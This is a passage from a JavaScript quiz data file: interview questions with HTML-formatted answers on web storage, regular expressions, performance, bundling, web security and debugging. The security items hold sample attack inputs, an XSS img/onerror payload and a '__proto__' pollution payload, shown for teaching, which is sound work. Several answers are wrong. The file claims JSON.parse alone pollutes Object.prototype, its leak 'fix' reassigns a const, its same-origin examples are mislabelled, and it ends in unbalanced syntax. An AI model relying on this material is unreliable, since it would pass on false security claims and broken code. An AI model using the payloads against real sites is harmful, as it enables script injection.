    // ── BATCH 10: Storage & Serialization ───────────────────────────────────
    {q:"What is localStorage vs sessionStorage vs cookies?",d:"hard",
     a:"<strong>localStorage:</strong> persistent (until cleared), same domain only.<br><strong>sessionStorage:</strong> session-only (cleared on tab close), same domain only.<br><strong>cookies:</strong> persistent (with expiry), sent with every request.<br><br><table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left'>Feature</th><th>localStorage</th><th>sessionStorage</th><th>cookies</th></tr><tr><td>Lifespan</td><td>Persistent</td><td>Session</td><td>Configurable</td></tr><tr><td>Domain</td><td>Same origin</td><td>Same origin</td><td>Can share</td></tr><tr><td>Sent in requests</td><td>No</td><td>No</td><td>Yes</td></tr><tr><td>Size limit</td><td>5-10MB</td><td>5-10MB</td><td>4KB</td></tr></table><br><pre>// localStorage
localStorage.setItem('key', 'value');
localStorage.getItem('key'); // 'value'
localStorage.removeItem('key');
localStorage.clear();

// sessionStorage
sessionStorage.setItem('key', 'value');

// cookies
document.cookie = 'key=value; max-age=3600; secure; samesite=strict';</pre>"},
    {q:"What are cookie attributes?",d:"hard",
     a:"<strong>Cookie attributes control behavior and security:</strong><br><pre>document.cookie = 'key=value; attributes';</pre><br><ul><li><code>Max-Age=seconds</code> — lifetime in seconds</li><li><code>Expires=date</code> — expiry date</li><li><code>Path=/</code> — path restriction</li><li><code>Domain=.example.com</code> — domain scope</li><li><code>Secure</code> — HTTPS only</li><li><code>HttpOnly</code> — cannot access via JS (server sets)</li><li><code>SameSite=Strict|Lax|None</code> — CSRF protection</li></ul><br><pre>// Secure, HttpOnly (must be server-set)
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

// Via JavaScript (HttpOnly inaccessible)
document.cookie = 'token=xyz; Max-Age=3600; Secure; Path=/';</pre>"},
    {q:"What is IndexedDB vs localStorage?",d:"hard",
     a:"<strong>localStorage:</strong> simple key-value, synchronous, 5-10MB, blocks UI.<br><strong>IndexedDB:</strong> large structured data, asynchronous, 50MB+, indexed queries.<br><pre>// localStorage — simple
localStorage.setItem('user', JSON.stringify({name: 'Alice'}));

// IndexedDB — complex
const request = indexedDB.open('mydb', 1);
request.onsuccess = (e) => {
  const db = e.target.result;
  const transaction = db.transaction('users', 'readwrite');
  const store = transaction.objectStore('users');
  store.add({id: 1, name: 'Alice'});
  store.index('byName').getAll('Alice');
};</pre><br><strong>Use IndexedDB for:</strong> large datasets, offline apps, complex queries."},
    {q:"What is the Service Worker lifecycle?",d:"hard",
     a:"<strong>Service Worker lifecycle:</strong> register → install → activate → fetch<br><pre>// Register
navigator.serviceWorker.register('/sw.js');

// sw.js
self.addEventListener('install', (e) => {
  e.waitUntil(
    caches.open('v1').then(cache => {
      return cache.addAll(['/index.html', '/style.css']);
    })
  );
});

self.addEventListener('activate', (e) => {
  e.waitUntil(
    caches.keys().then(names => {
      return Promise.all(
        names.map(name => caches.delete(name))
      );
    })
  );
});

self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request)
      .then(resp => resp || fetch(e.request))
  );
});</pre>"},
    {q:"What is JSON.stringify() with replacer and reviver?",d:"hard",
     a:"<strong>replacer:</strong> function to transform values during stringify.<br><strong>reviver:</strong> function to transform values during parse.<br><pre>// Replacer (stringify)
const obj = {name: 'Alice', age: 30, secret: 'hidden'};
const json = JSON.stringify(obj, (key, val) => {
  if (key === 'secret') return undefined; // exclude
  if (typeof val === 'number') return val * 2; // transform
  return val;
});

// Reviver (parse)
const str = '{"date":"2024-01-01T00:00:00Z","count":42}';
const data = JSON.parse(str, (key, val) => {
  if (key === 'date') return new Date(val); // convert to Date
  return val;
});
data.date; // Date object
data.count; // 42</pre><br><strong>Use case:</strong> custom serialization, filtering secrets, type conversion."}
  
    // ── BATCH 11: RegExp & Built-ins ───────────────────────────────────────
    {q:"What are RegExp flags?",d:"hard",
     a:"<strong>RegExp flags</strong> modify pattern matching behavior:<br><ul><li><code>g</code> — global (all matches, not just first)</li><li><code>i</code> — case-insensitive</li><li><code>m</code> — multiline (^ $ match line boundaries)</li><li><code>s</code> — dotall (. matches newline)</li><li><code>y</code> — sticky (match from lastIndex)</li><li><code>d</code> — hasIndices (capture indices)</li><li><code>u</code> — unicode (proper UTF-16)</li></ul><br><pre>const text = 'Hello\nWorld';

/^W/.test(text);       // false
/^W/m.test(text);      // true — multiline

/hello/i.test(text);   // true — case-insensitive

text.match(/l/g);      // ['l','l','l'] — global
text.match(/l/);       // ['l'] — first only</pre>"},
    {q:"What is the difference between exec(), test(), and match()?",d:"hard",
     a:"<strong>exec():</strong> returns match array with groups and index.<br><strong>test():</strong> returns boolean (true/false).<br><strong>match():</strong> string method, returns all matches or null.<br><pre>const pattern = /l(\w)/g;
const text = 'hello';

// exec() — returns array with captured groups
pattern.exec(text); // ['ll', 'l']
pattern.lastIndex = 0; // reset

// test() — returns boolean
/l/.test(text); // true
/x/.test(text); // false

// match() — string method
text.match(/l/g); // ['l','l']
text.match(/l/);  // ['l']
text.match(/x/);  // null</pre>"},
    {q:"What are lookahead and lookbehind assertions?",d:"hard",
     a:"<strong>Lookahead (?=):</strong> positive, must be followed by pattern.<br><strong>Negative lookahead (?!):</strong> must NOT be followed.<br><strong>Lookbehind (?<=):</strong> must be preceded by pattern (ES2018).<br><strong>Negative lookbehind (?<!):</strong> must NOT be preceded.<br><pre>// Lookahead
/\d+(?=px)/.test('16px');      // true — number followed by 'px'
/\d+(?!px)/.test('16pt');      // true — number NOT followed by 'px'

// Lookbehind (ES2018)
/(?<=\$)\d+/.test('$100');     // true — number preceded by '$'
/(?<!\d)@/.test('user@host');  // true — '@' NOT preceded by digit</pre>"},
    {q:"What are named capture groups?",d:"hard",
     a:"<strong>Named capture groups</strong> name captured parts for clarity.<br><pre>// Unnamed
const pattern1 = /(\d{4})-(\d{2})-(\d{2})/;
const match = '2024-01-15'.match(pattern1);
match[1]; // '2024'
match[2]; // '01'

// Named (more readable)
const pattern2 = /(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})/;
const result = '2024-01-15'.match(pattern2);
result.groups.year;  // '2024'
result.groups.month; // '01'
result.groups.day;   // '15'</pre>"},
    {q:"What is BigInt and its limitations?",d:"hard",
     a:"<strong>BigInt</strong> is a primitive for arbitrarily large integers (suffix <code>n</code>).<br><pre>// Large numbers lose precision
Number.MAX_SAFE_INTEGER; // 9007199254740991
const big = 9007199254740992n;

big + 1n; // 9007199254740993n
big.toString(); // '9007199254740992'

// Cannot mix BigInt with Number
10n + 5;   // TypeError
10n + 5n;  // 15n

// Math functions don't work
Math.sqrt(16n); // TypeError

// Comparisons work
10n > 5;  // true
10n === 10; // false (different type)</pre><br><strong>Limitations:</strong> no decimals, no Math functions, slower than numbers."},
    {q:"What are Number methods: isInteger, isSafeInteger, isNaN?",d:"medium",
     a:"<strong>Number.isInteger():</strong> check if integer (no decimals).<br><strong>Number.isSafeInteger():</strong> check if within safe range.<br><strong>Number.isNaN():</strong> true only for actual NaN (not coerced).<br><pre>Number.isInteger(42);     // true
Number.isInteger(42.5);   // false
Number.isInteger(NaN);    // false

Number.isSafeInteger(42); // true
Number.isSafeInteger(9007199254740992); // false

Number.isNaN(NaN);        // true
Number.isNaN('NaN');      // false (unlike isNaN!)
Number.isNaN(undefined);  // false

// Global isNaN coerces!
isNaN('hello'); // true (coerced to NaN)
Number.isNaN('hello'); // false (no coercion)</pre>"},

    // ── BATCH 12: Performance & Optimization ────────────────────────────────
    {q:"What is critical rendering path (CRP)?",d:"hard",
     a:"<strong>Critical Rendering Path</strong> is the sequence of steps browser takes to convert HTML/CSS/JS to pixels:<br><pre>1. Parse HTML → DOM tree
2. Parse CSS → CSSOM tree
3. Combine DOM + CSSOM → Render tree
4. Layout → compute positions/sizes
5. Paint → rasterize pixels
6. Composite → combine layers</pre><br><strong>Optimization:</strong><br><ul><li>Minimize critical resources (CSS, JS files)</li><li>Inline critical CSS</li><li>Defer non-critical JS</li><li>Preload fonts</li><li>Compress assets</li></ul><br><pre>// Block rendering
<script src='critical.js'></script>

// Non-blocking
<script src='non-critical.js' defer></script>

// Preload font
<link rel='preload' as='font' href='font.woff2'></pre>"},
    {q:"What is reflow vs repaint?",d:"hard",
     a:"<strong>Reflow (layout):</strong> browser recalculates element positions/sizes. Expensive!<br><strong>Repaint:</strong> browser redraws pixels. Less expensive than reflow.<br><br><strong>Triggers reflow:</strong> width, height, position, margin, padding, display, font-size, overflow<br><strong>Triggers repaint:</strong> color, background, box-shadow, opacity<br><pre>// Reflow triggers
elem.style.width = '100px';   // layout change
elem.offsetWidth;              // force reflow
elem.style.backgroundColor = 'red'; // repaint only
getComputedStyle(elem);        // reads cause reflow

// Batch DOM changes (avoid layout thrashing)
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const el = document.createElement('div');
  fragment.appendChild(el);
}
document.body.appendChild(fragment); // single reflow</pre>"},
    {q:"What is debouncing vs throttling?",d:"hard",
     a:"<strong>Debouncing:</strong> delay function call until after N ms of inactivity.<br><strong>Throttling:</strong> limit function calls to at most once every N ms.<br><pre>// Debounce (resize, search input)
function debounce(fn, delay) {
  let timeout;
  return function(...args) {
    clearTimeout(timeout);
    timeout = setTimeout(() => fn(...args), delay);
  };
}

const search = debounce((query) => {
  console.log('Searching for:', query);
}, 500);

input.addEventListener('input', (e) => search(e.target.value));
// Only calls when user stops typing for 500ms

// Throttle (scroll, mouse move)
function throttle(fn, limit) {
  let lastRun = 0;
  return function(...args) {
    const now = Date.now();
    if (now - lastRun >= limit) {
      fn(...args);
      lastRun = now;
    }
  };
}

const onScroll = throttle(() => {
  console.log('Scrolling');
}, 1000);

window.addEventListener('scroll', onScroll);
// Calls at most once per 1000ms</pre>"},
    {q:"What is requestAnimationFrame?",d:"medium",
     a:"<strong>requestAnimationFrame()</strong> schedules callback before next repaint (60fps).<br><pre>let id = requestAnimationFrame(callback);
cancelAnimationFrame(id);

// Smooth animation
function animate() {
  element.style.transform = `translateX(${x}px)`;
  x += 5;
  if (x < 500) {
    requestAnimationFrame(animate);
  }
}

requestAnimationFrame(animate);</pre><br><strong>Advantages over setTimeout:</strong><br><ul><li>Synced with browser refresh rate</li><li>Paused when tab is hidden</li><li>Better performance</li></ul>"},
    {q:"What are resource hints?",d:"hard",
     a:"<strong>Resource hints</strong> help browser optimize loading:<br><ul><li><code>preconnect</code> — pre-establish TCP connection</li><li><code>dns-prefetch</code> — resolve DNS early</li><li><code>preload</code> — load resource with high priority</li><li><code>prefetch</code> — load resource for future use</li><li><code>prerender</code> — prerender entire page</li></ul><br><pre>&lt;!-- DNS lookup only --&gt;
&lt;link rel='dns-prefetch' href='https://cdn.example.com'&gt;

&lt;!-- TCP handshake + SSL --&gt;
&lt;link rel='preconnect' href='https://fonts.googleapis.com'&gt;

&lt;!-- Load now with high priority --&gt;
&lt;link rel='preload' as='script' href='critical.js'&gt;
&lt;link rel='preload' as='font' href='font.woff2'&gt;

&lt;!-- Load for future use --&gt;
&lt;link rel='prefetch' href='next-page.js'&gt;</pre>"},

    // ── BATCH 13: Module System & Build ────────────────────────────────────
    {q:"What is CSS-in-JS vs CSS modules vs plain CSS?",d:"medium",
     a:"<strong>Plain CSS:</strong> global scope, name collisions, easy to learn.<br><strong>CSS Modules:</strong> scoped locally, imports in JS, no global collisions.<br><strong>CSS-in-JS:</strong> styles as objects, dynamic, tied to components.<br><pre>// Plain CSS
/* style.css */
.button { color: blue; }

<!-- index.html -->
<link rel='stylesheet' href='style.css'>

// CSS Modules
import styles from './styles.module.css';
<button className={styles.button}>Click</button>

// CSS-in-JS (styled-components)
const Button = styled.button`
  color: blue;
  &:hover { color: darkblue; }
`;
<Button>Click</Button></pre>"},
    {q:"What is code splitting and dynamic imports?",d:"hard",
     a:"<strong>Code splitting</strong> divides bundle into chunks, loaded on-demand.<br><strong>Dynamic import()</strong> loads module as Promise.<br><pre>// Static import — bundled upfront
import Component from './Component';

// Dynamic import — loaded on-demand
const Component = await import('./Component');

// Use with Webpack
const Home = lazy(() => import('./pages/Home'));
const About = lazy(() => import('./pages/About'));

<Suspense fallback={<Loading />}>
  <Component />
</Suspense></pre><br><strong>Benefits:</strong> smaller initial bundle, faster first load, lazy routes."},
    {q:"What is tree shaking?",d:"hard",
     a:"<strong>Tree shaking</strong> removes unused code during bundling.<br><pre>// module.js
export function used() { return 42; }
export function unused() { return 0; }

// main.js
import { used } from './module';
console.log(used()); // unused() never called

// With tree shaking enabled, bundler removes unused()</pre><br><strong>Requirements:</strong><ul><li>ES modules (import/export)</li><li>Bundler support (Webpack, Rollup, Parcel)</li><li>Package.json has sideEffects: false</li></ul><br><pre>// package.json
{
  "sideEffects": false, // no side effects = safe to remove
  "type": "module"
}</pre>"},
    {q:"What is webpack Hot Module Replacement (HMR)?",d:"hard",
     a:"<strong>HMR</strong> allows modules to be updated without full page reload during development.<br><pre>// webpack.config.js
module.exports = {
  devServer: {
    hot: true
  }
};

// src/index.js
if (module.hot) {
  module.hot.accept('./Component', () => {
    // reload Component
  });
}</pre><br><strong>Process:</strong><br><ol><li>File changes detected</li><li>New module compiled</li><li>Browser notified via WebSocket</li><li>Old module replaced with new</li><li>App state preserved (if handler exists)</li></ol>"},
    {q:"What is module caching and singleton pattern?",d:"hard",
     a:"<strong>Module caching:</strong> modules are loaded once and cached for subsequent imports.<br><pre>// singleton.js
class Database {
  constructor() {
    this.connection = null;
  }
  connect() { this.connection = new Connection(); }
}
module.exports = new Database();

// app.js
const db1 = require('./singleton');
const db2 = require('./singleton');
db1 === db2; // true — same instance (cached)</pre><br><strong>Module caching guarantees:</strong> each module executed once, exports cached, subsequent imports get cached reference."},

    // ── BATCH 14: Security, Debugging & Advanced ───────────────────────────
    {q:"What is Cross-Site Scripting (XSS) and how to prevent it?",d:"hard",
     a:"<strong>XSS attack:</strong> inject malicious scripts into webpage.<br><strong>Types:</strong> Stored (database), Reflected (URL), DOM-based.<br><br><strong>Prevention:</strong><ol><li>Escape/sanitize user input</li><li>Use textContent instead of innerHTML</li><li>CSP headers</li><li>DOMPurify library</li></ol><br><pre>// VULNERABLE
elem.innerHTML = userInput; // if userInput = '<img src=x onerror="alert()">'  

// SAFE
elem.textContent = userInput; // displays as text

// SAFE with HTML
const sanitized = DOMPurify.sanitize(userInput);
elem.innerHTML = sanitized;

// CSP header
Content-Security-Policy: script-src 'self';</pre>"},
    {q:"What is Content Security Policy (CSP)?",d:"hard",
     a:"<strong>CSP</strong> is HTTP header limiting which resources can load.<br><pre>// header
Content-Security-Policy: script-src 'self' https://trusted.com

// In meta tag
<meta http-equiv='Content-Security-Policy' content="script-src 'self'">

// Directives
script-src       // scripts
style-src        // stylesheets
img-src          // images
font-src         // fonts
connect-src      // fetch, XHR, WebSocket
frame-src        // iframes
object-src       // plugins

// Values
'self'           // same origin
https:           // HTTPS only
domain.com       // specific domain
'unsafe-inline'  // allow inline (not recommended)
'nonce-RANDOM'   // inline script with nonce</pre>"},
    {q:"What is CORS and preflight requests?",d:"hard",
     a:"<strong>CORS (Cross-Origin Resource Sharing)</strong> allows cross-origin requests.<br><strong>Preflight:</strong> browser sends OPTIONS before POST/PUT/DELETE with custom headers.<br><pre>// Simple request (no preflight)
GET, POST (application/x-www-form-urlencoded)

// Preflight required
PUT, DELETE, POST (application/json), Custom headers

// Server response
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true

// Client request
fetch('https://api.other.com/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include' // send cookies
});</pre>"},
    {q:"What is prototype pollution and how to prevent it?",d:"hard",
     a:"<strong>Prototype pollution:</strong> attacker modifies Object.prototype affecting all objects.<br><pre>// Vulnerable
const obj = JSON.parse('{"__proto__":{"admin":true}}');
const user = {};
user.admin; // true — POLLUTED!

// Attack payload
{"__proto__":{"isAdmin":true}}

// Prevention
1. Avoid recursively merging untrusted data
2. Use Object.create(null) for data objects
3. Validate and sanitize input
4. Use libraries (lodash.merge() is safer)

const safe = Object.create(null);
safe.x = 1; // won't pollute prototype

// Safe merge
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key !== '__proto__' && key !== 'constructor') {
      target[key] = source[key];
    }
  }
  return target;
}</pre>"},
    {q:"What is Same-Origin Policy (SOP)?",d:"medium",
     a:"<strong>SOP</strong> restricts scripts from accessing data from different origins without permission.<br><pre>// Same origin: protocol, domain, port all match
https://example.com:443

// Different origins (blocked by SOP)
https://example.com/      // different port
http://example.com/       // different protocol
https://sub.example.com/  // different subdomain

// What SOP restricts
XMLHttpRequest, fetch  // blocked
iframes (with access)  // blocked
web storage access     // blocked
cookies (partially)    // restricted

// Exceptions
<script src='https://other.com/lib.js'> <!-- allowed -->
<img src='https://other.com/pic.jpg'>   <!-- allowed -->
<style>@import url(...)</style>          <!-- allowed -->
fetch() / XHR                            <!-- blocked --></pre>"},

    // ── BATCH 15: DevTools & Monitoring ────────────────────────────────────
    {q:"What are DevTools console methods?",d:"easy",
     a:"<strong>Beyond console.log():</strong><br><pre>console.log('info');       // normal
console.warn('warning');   // yellow
console.error('error');    // red
console.debug('debug');    // debug level
console.info('info');      // info level

console.table([{a:1},{a:2}]); // table format
console.dir(obj);          // object properties
console.dirxml(elem);      // DOM element

console.assert(x > 0, 'x must be positive');
console.clear();           // clear console

// Grouping
console.group('User');
console.log('Name: Alice');
console.log('Age: 30');
console.groupEnd();

// Timing
console.time('operation');
// code here
console.timeEnd('operation'); // logs elapsed ms

// Stack trace
console.trace();</pre>"},
    {q:"What is source mapping and SourceMap?",d:"hard",
     a:"<strong>SourceMap</strong> maps minified code back to original source for debugging.<br><pre>// Minified bundle: app.min.js (hard to debug)
const x=()=>{console.log(1)};

// SourceMap: app.min.js.map
{
  "version": 3,
  "sources": ["app.js"],
  "mappings": "AAAA,IAAM..."
}

// In minified file
//# sourceMappingURL=app.min.js.map

// DevTools shows original code when debugging</pre><br><strong>Generation:</strong> Webpack, Rollup, Parcel auto-generate sourcemaps in development."},
    {q:"What is memory leak detection?",d:"hard",
     a:"<strong>Memory leaks occur when objects aren't garbage collected.</strong><br><strong>Common causes:</strong><br><ul><li>Dangling event listeners</li><li>Circular references</li><li>Global variables</li><li>Timers (setTimeout, setInterval) not cleared</li><li>DOM nodes detached but still referenced</li></ul><br><pre>// Memory leak
const detached = document.getElementById('node');
const obj = { ref: detached };
detached.remove(); // removed from DOM but still in memory!

// Fix
detached = null; // release reference

// Detect with DevTools
1. Open DevTools → Memory
2. Take heap snapshot
3. Perform action
4. Take another snapshot
5. Compare (growth = leak)</pre>"},
    {q:"What is Node.js debugging?",d:"hard",
     a:"<strong>Debug Node.js with --inspect flag:</strong><br><pre>node --inspect app.js
node --inspect-brk app.js  // break on first line

// DevTools URL: chrome://inspect
// Or use debugger statement

debugger; // execution pauses here
const x = 42; // inspect x when paused</pre><br><strong>VSCode:</strong><br><pre>// .vscode/launch.json
{
  "version": "0.2.0",
  "configurations": [{
    "type": "node",
    "request": "launch",
    "program": "${workspaceFolder}/app.js"
  }]
}</pre>"},
    {q:"What is the error stack and how to read it?",d:"medium",
     a:"<strong>Error stack trace shows function call chain:</strong><br><pre>Error: Something went wrong
    at functionA (app.js:10:5)
    at functionB (app.js:20:3)
    at Object.<anonymous> (app.js:30:1)
    at Module._load (internal/modules/cjs/loader.js:926:23)

// Format: at function (filename:line:column)

// Create custom error with stack
try {
  doSomething();
} catch (e) {
  console.log(e.stack); // full stack
  console.log(e.message);
  console.log(e.name);
}</pre><br><strong>Source maps needed to map to original code.</strong>"}
  );

);
